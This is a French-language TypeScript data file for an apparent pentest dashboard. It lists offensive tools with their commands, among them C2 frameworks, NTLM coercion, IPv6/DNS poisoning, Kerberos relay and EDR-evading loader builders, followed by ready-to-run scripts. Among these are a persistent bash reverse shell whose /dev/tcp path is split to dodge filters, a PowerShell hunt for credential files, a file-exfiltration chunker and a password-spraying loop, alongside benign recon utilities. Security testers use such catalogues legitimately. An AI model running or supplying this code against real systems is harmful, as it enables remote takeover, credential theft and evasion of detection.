  { name: "Sliver", url: "https://github.com/BishopFox/sliver", phase: "Post-exploit", desc: "Framework C2 open-source multi-plateforme (mTLS, DNS, HTTP).", cmd: "sliver > generate --mtls 10.10.14.1 --os windows", tags: ["c2", "implant"] },
  { name: "Havoc", url: "https://github.com/HavocFramework/Havoc", phase: "Post-exploit", desc: "Framework C2 moderne avec agent Demon furtif.", cmd: "./havoc server -p 40056", tags: ["c2", "evasion"] },
  { name: "Mythic", url: "https://github.com/its-a-feature/Mythic", phase: "Post-exploit", desc: "Plateforme C2 modulaire pilotée par agents (Apollo, Poseidon…).", cmd: "sudo ./mythic-cli start", tags: ["c2", "modulaire"] },
  { name: "PoshC2", url: "https://github.com/nettitude/PoshC2", phase: "Post-exploit", desc: "Framework C2 axé PowerShell/.NET pour la post-exploitation.", cmd: "posh-project -n op1; posh-server", tags: ["c2", "powershell"] },
  { name: "Villain", url: "https://github.com/t3l3machus/Villain", phase: "Post-exploit", desc: "Gestionnaire de shells/backdoors avec partage entre sessions.", cmd: "python3 Villain.py", tags: ["c2", "shells"] },
  { name: "Merlin", url: "https://github.com/Ne0nd0g/merlin", phase: "Post-exploit", desc: "C2 post-exploitation cross-plateforme basé sur HTTP/2.", cmd: "./merlinServer-Linux-x64", tags: ["c2", "http2"] },
  { name: "Nishang", url: "https://github.com/samratashok/nishang", phase: "Exploit", desc: "Collection de scripts PowerShell offensifs.", cmd: "Import-Module .\\nishang.psm1", tags: ["powershell", "offensive"] },
  { name: "PowerSploit", url: "https://github.com/PowerShellMafia/PowerSploit", phase: "Post-exploit", desc: "Modules PowerShell post-exploitation (PowerView, Invoke-Mimikatz).", cmd: "Import-Module .\\PowerView.ps1", tags: ["powershell", "ad"] },
  { name: "SharpHound", url: "https://github.com/BloodHoundAD/SharpHound", phase: "Enum", desc: "Collecteur de données AD pour BloodHound (.NET).", cmd: "SharpHound.exe -c All", tags: ["ad", "collector"] },
  { name: "Seatbelt", url: "https://github.com/GhostPack/Seatbelt", phase: "Enum", desc: "Recensement de la posture de sécurité d'un hôte Windows.", cmd: "Seatbelt.exe -group=all", tags: ["windows", "recon"] },
  { name: "SharpUp", url: "https://github.com/GhostPack/SharpUp", phase: "Enum", desc: "Détection d'élévation de privilèges Windows (port de PowerUp).", cmd: "SharpUp.exe audit", tags: ["privesc", "windows"] },
  { name: "Certify", url: "https://github.com/GhostPack/Certify", phase: "Enum", desc: "Énumération et abus des templates AD CS vulnérables.", cmd: "Certify.exe find /vulnerable", tags: ["adcs", "ad"] },
  { name: "Coercer", url: "https://github.com/p0dalirius/Coercer", phase: "Exploit", desc: "Force un hôte Windows à s'authentifier (PetitPotam & co).", cmd: "coercer coerce -t DC -l attacker", tags: ["coercion", "ad"] },
  { name: "mitm6", url: "https://github.com/dirkjanm/mitm6", phase: "Exploit", desc: "Empoisonnement IPv6/DNS pour le relais d'authentification.", cmd: "mitm6 -d domain.local", tags: ["ipv6", "relay"] },
  { name: "krbrelayx", url: "https://github.com/dirkjanm/krbrelayx", phase: "Exploit", desc: "Relais et abus de délégation Kerberos.", cmd: "krbrelayx.py -t ldap://DC", tags: ["kerberos", "relay"] },
  { name: "donut", url: "https://github.com/TheWover/donut", phase: "Post-exploit", desc: "Génère du shellcode position-indépendant depuis un PE/.NET.", cmd: "donut -i payload.exe -o sc.bin", tags: ["shellcode", "loader"] },
  { name: "ScareCrow", url: "https://github.com/optiv/ScareCrow", phase: "Post-exploit", desc: "Génération de loaders avec contournement EDR/AV.", cmd: "./ScareCrow -I sc.bin -Loader dll", tags: ["evasion", "edr"] },
  { name: "Inveigh", url: "https://github.com/Kevin-Robertson/Inveigh", phase: "Post-exploit", desc: "Outil de spoofing/MITM LLMNR/NBNS/mDNS pour Windows.", cmd: "Invoke-Inveigh -ConsoleOutput Y", tags: ["llmnr", "windows"] },
];

export interface Script {
  id: string;
  name: string;
  lang: Lang;
  phase: Phase;
  desc: string;
  code: string;
}

export const SCRIPTS: Script[] = [
  {
    id: "subhunt",
    name: "subhunt.py",
    lang: "Python",
    phase: "Recon",
    desc: "Résolution DNS concurrente d'une wordlist de sous-domaines.",
    code: `#!/usr/bin/env python3
import asyncio, sys
import aiodns

resolver = aiodns.DNSResolver()

async def resolve(sub, domain):
    host = f"{sub}.{domain}"
    try:
        await resolver.query(host, "A")
        print(host)
    except Exception:
        pass

async def main(domain, wordlist):
    with open(wordlist) as f:
        subs = [l.strip() for l in f if l.strip()]
    await asyncio.gather(*(resolve(s, domain) for s in subs))

if __name__ == "__main__":
    asyncio.run(main(sys.argv[1], sys.argv[2]))`,
  },
  {
    id: "revshell",
    name: "revshell.sh",
    lang: "Bash",
    phase: "Exploit",
    desc: "Reverse shell bash robuste avec reconnexion automatique.",
    code: `#!/usr/bin/env bash
# Usage: ./revshell.sh <LHOST> <LPORT>
LHOST="\${1:?LHOST requis}"; LPORT="\${2:?LPORT requis}"
while true; do
  bash -i >& /dev/t""cp/$LHOST/$LPORT 0>&1
  sleep 5   # reconnexion si la session tombe
done`,
  },
  {
    id: "loot",
    name: "loot.ps1",
    lang: "PowerShell",
    phase: "Post-exploit",
    desc: "Collecte rapide de fichiers sensibles sur un hôte Windows.",
    code: `# Recherche de secrets dans les emplacements courants
$patterns = "*.kdbx","*.config","unattend.xml","*.rdp","*pass*","*.ovpn"
$roots    = "C:\\Users","C:\\inetpub","C:\\Windows\\Panther"
foreach ($r in $roots) {
  foreach ($p in $patterns) {
    Get-ChildItem -Path $r -Filter $p -Recurse -ErrorAction SilentlyContinue |
      Select-Object FullName, Length, LastWriteTime
  }
}`,
  },
  {
    id: "portscan",
    name: "portscan.py",
    lang: "Python",
    phase: "Recon",
    desc: "Scanner de ports TCP asynchrone (connect scan) sans dépendance.",
    code: `#!/usr/bin/env python3
import asyncio, sys

async def scan(host, port, timeout=1.0):
    try:
        fut = asyncio.open_connection(host, port)
        _, w = await asyncio.wait_for(fut, timeout)
        w.close()
        print(f"[+] {port}/tcp open")
    except Exception:
        pass

async def main(host):
    await asyncio.gather(*(scan(host, p) for p in range(1, 1025)))

if __name__ == "__main__":
    asyncio.run(main(sys.argv[1]))`,
  },
  {
    id: "dirbrute",
    name: "dirbrute.py",
    lang: "Python",
    phase: "Enum",
    desc: "Brute-force de répertoires web à partir d'une wordlist.",
    code: `#!/usr/bin/env python3
import sys, requests

base = sys.argv[1].rstrip("/")
with open(sys.argv[2]) as f:
    for line in f:
        path = line.strip()
        if not path:
            continue
        url = f"{base}/{path}"
        r = requests.get(url, allow_redirects=False, timeout=5)
        if r.status_code != 404:
            print(f"{r.status_code}  {url}")`,
  },
  {
    id: "jwt-none",
    name: "jwt_none.py",
    lang: "Python",
    phase: "Exploit",
    desc: "Forge un JWT 'alg:none' pour tester une validation de signature défaillante.",
    code: `#!/usr/bin/env python3
import base64, json, sys

def b64(d):
    return base64.urlsafe_b64encode(d).rstrip(b"=").decode()

header = {"alg": "none", "typ": "JWT"}
payload = json.loads(sys.argv[1]) if len(sys.argv) > 1 else {"user": "admin"}
print(b64(json.dumps(header).encode()) + "." + b64(json.dumps(payload).encode()) + ".")`,
  },
  {
    id: "hashid",
    name: "hashid.sh",
    lang: "Bash",
    phase: "Exploit",
    desc: "Identifie un type de hash selon sa longueur (heuristique rapide).",
    code: `#!/usr/bin/env bash
h="\${1:?usage: hashid.sh <hash>}"
case "\${#h}" in
  32)  echo "MD5 / NTLM" ;;
  40)  echo "SHA1" ;;
  64)  echo "SHA256" ;;
  128) echo "SHA512" ;;
  *)   echo "inconnu (longueur \${#h})" ;;
esac`,
  },
  {
    id: "cidr",
    name: "cidr.sh",
    lang: "Bash",
    phase: "Recon",
    desc: "Étend un bloc CIDR en liste d'adresses IP exploitables.",
    code: `#!/usr/bin/env bash
cidr="\${1:?usage: cidr.sh <CIDR>}"
python3 -c "import ipaddress,sys; [print(ip) for ip in ipaddress.ip_network(sys.argv[1]).hosts()]" "$cidr"`,
  },
  {
    id: "genwordlist",
    name: "genwordlist.py",
    lang: "Python",
    phase: "Enum",
    desc: "Génère des variantes (années, leet, capitalisation) depuis une base.",
    code: `#!/usr/bin/env python3
import sys
suffixes = ["", "1", "123", "2024", "2025", "!"]
leet = str.maketrans("aeiosAEIOS", "4310541054")
with open(sys.argv[1]) as f:
    for w in (l.strip() for l in f if l.strip()):
        for s in suffixes:
            print(w + s)
            print(w.capitalize() + s)
        print(w.translate(leet))`,
  },
  {
    id: "urlextract",
    name: "urlextract.py",
    lang: "Python",
    phase: "Recon",
    desc: "Extrait toutes les URLs et emails d'un fichier (dédupliqués).",
    code: `#!/usr/bin/env python3
import re, sys
data = open(sys.argv[1]).read()
for u in sorted(set(re.findall(r"https?://[^\\s\\"'<>]+", data))):
    print(u)
for e in sorted(set(re.findall(r"[\\w.+-]+@[\\w-]+\\.[\\w.-]+", data))):
    print(e)`,
  },
  {
    id: "ipextract",
    name: "ipextract.sh",
    lang: "Bash",
    phase: "Recon",
    desc: "Extrait et déduplique les adresses IPv4 d'un fichier.",
    code: `#!/usr/bin/env bash
grep -oE "([0-9]{1,3}\\.){3}[0-9]{1,3}" "\${1:?usage: ipextract.sh <file>}" | sort -u`,
  },
  {
    id: "httpprobe",
    name: "httpprobe.py",
    lang: "Python",
    phase: "Recon",
    desc: "Teste quels hôtes d'une liste répondent en HTTP(S).",
    code: `#!/usr/bin/env python3
import sys, requests
for host in (l.strip() for l in open(sys.argv[1]) if l.strip()):
    for scheme in ("https://", "http://"):
        try:
            r = requests.head(scheme + host, timeout=4, allow_redirects=True)
            print(f"{r.status_code}  {scheme}{host}")
            break
        except Exception:
            pass`,
  },
  {
    id: "logtriage",
    name: "logtriage.sh",
    lang: "Bash",
    phase: "Reporting",
    desc: "Top des IP en échec d'authentification SSH depuis auth.log.",
    code: `#!/usr/bin/env bash
log="\${1:-/var/log/auth.log}"
echo "[*] Echecs SSH par IP :"
grep "Failed password" "$log" | grep -oE "([0-9]{1,3}\\.){3}[0-9]{1,3}" | sort | uniq -c | sort -rn | head`,
  },
  {
    id: "xorb64",
    name: "xorb64.py",
    lang: "Python",
    phase: "Exploit",
    desc: "XOR d'une chaîne avec une clé répétée, sortie en base64.",
    code: `#!/usr/bin/env python3
import sys, base64
data = sys.argv[1].encode()
key = sys.argv[2].encode()
out = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
print(base64.b64encode(out).decode())`,
  },
  {
    id: "stabilize",
    name: "stabilize.sh",
    lang: "Bash",
    phase: "Post-exploit",
    desc: "Stabilise un reverse shell en TTY interactif complet (PTY + stty).",
    code: `#!/usr/bin/env bash
# À coller dans le shell distant, puis Ctrl-Z et la ligne stty en local.
python3 -c 'import pty; pty.spawn("/bin/bash")' 2>/dev/null \\
  || python -c 'import pty; pty.spawn("/bin/bash")' \\
  || script -qc /bin/bash /dev/null
export TERM=xterm-256color
# En local :  stty raw -echo; fg   puis dans le shell :  stty rows 50 cols 200`,
  },
  {
    id: "b64chunk",
    name: "b64chunk.py",
    lang: "Python",
    phase: "Post-exploit",
    desc: "Exfiltre un fichier en base64 découpé en lignes copiables sans réseau.",
    code: `#!/usr/bin/env python3
import base64, sys
raw = open(sys.argv[1], "rb").read()
enc = base64.b64encode(raw).decode()
width = int(sys.argv[2]) if len(sys.argv) > 2 else 76
for i in range(0, len(enc), width):
    print(enc[i:i + width])
# Reconstruction :  cat chunks.txt | base64 -d > fichier`,
  },
  {
    id: "spray",
    name: "spray.py",
    lang: "Python",
    phase: "Enum",
    desc: "Password spraying lent et temporisé sur une liste d'utilisateurs (un seul mot de passe).",
    code: `#!/usr/bin/env python3
import sys, time, subprocess
users = [u.strip() for u in open(sys.argv[1]) if u.strip()]
password, target = sys.argv[2], sys.argv[3]
for u in users:
    # Remplace par le module adapté (nxc, kerbrute, etc.)
    print(f"[*] {u}:{password}")
    subprocess.run(["nxc", "smb", target, "-u", u, "-p", password], check=False)
    time.sleep(3)   # temporisation anti-lockout`,
  },
];

/* Statistiques dérivées des vraies données (affichées sur le dashboard). */
export const STATS = {
  resources: RESOURCES.length,
  writeups: WRITEUPS.length,
  tools: EXTERNAL_TOOLS.length + SCRIPTS.length,
  cves: CVES.length,
  scripts: SCRIPTS.length,
  domains: DOMAINS.length,
  resolved: WRITEUPS.filter((w) => w.status === "résolu").length,
};

/* ── Agrégats de couverture (dérivés, pour les barres du dashboard) ── */

function countBy<T>(items: T[], key: (t: T) => string): { label: string; count: number }[] {
  const acc = new Map<string, number>();
  for (const it of items) {
    const k = key(it);
    acc.set(k, (acc.get(k) ?? 0) + 1);
  }
  return [...acc.entries()]
    .map(([label, count]) => ({ label, count }))
    .sort((a, b) => b.count - a.count);
}

/** Ressources réparties par domaine (Web, Réseau, Reverse…). */
export const COVERAGE_BY_DOMAIN = countBy(RESOURCES, (r) => r.domain);

/** Outils de l'arsenal répartis par phase de la kill-chain. */
export const COVERAGE_BY_PHASE = countBy(EXTERNAL_TOOLS, (t) => t.phase);
